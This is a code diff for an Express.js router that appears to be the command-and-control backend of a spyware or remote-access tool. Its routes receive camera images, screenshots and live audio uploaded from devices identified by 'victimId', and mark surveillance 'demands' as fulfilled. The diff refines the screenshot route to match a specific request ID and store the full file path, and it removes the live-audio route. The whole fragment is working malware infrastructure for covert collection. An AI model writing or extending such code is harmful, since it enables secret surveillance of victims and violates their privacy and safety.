@@ -32,13 +32,15 @@ router.post('/camera/:victimId', upload.single('img'), async (req, res, next) =>
     }
 });
 
-// Similar routes for screenshot, liveAudio, location, and history...
-
+/**
+ * Handle screenshot upload
+ * @route POST /api/fulfill/screenshot/:victimId
+ */
 router.post('/screenshot/:victimId', upload.single('img'), async (req, res, next) => {
     try {
         const updatedRequest = await Request.findOneAndUpdate(
-            { victimId: req.params.victimId, demand: 'screenshot' },
-            { fulfilled: true, fulfilledAt: req.file.destination },
+            { victimId: req.params.victimId, _id: req.body.requestId, demand: 'screenshot' },
+            { fulfilled: true, fulfilledAt: req.file.destination + '/' + req.file.filename },
             { new: true }
         );
         res.json(updatedRequest);
@@ -46,21 +48,6 @@ router.post('/screenshot/:victimId', upload.single('img'), async (req, res, next
         next(err);
     }
 });
-
-router.post('/liveAudio/:victimId', upload.single('audio'), async (req, res, next) => {
-    try {
-        const updatedRequest = await Request.findOneAndUpdate(
-            { victimId: req.params.victimId, demand: 'liveAudio' },
-            { fulfilled: true, fulfilledAt: req.file.destination },
-            { new: true }
-        );
-        res.json(updatedRequest);
-    } catch (err) {
-        next(err);
-    }
-})
-
-//TODO
 
 
 /**
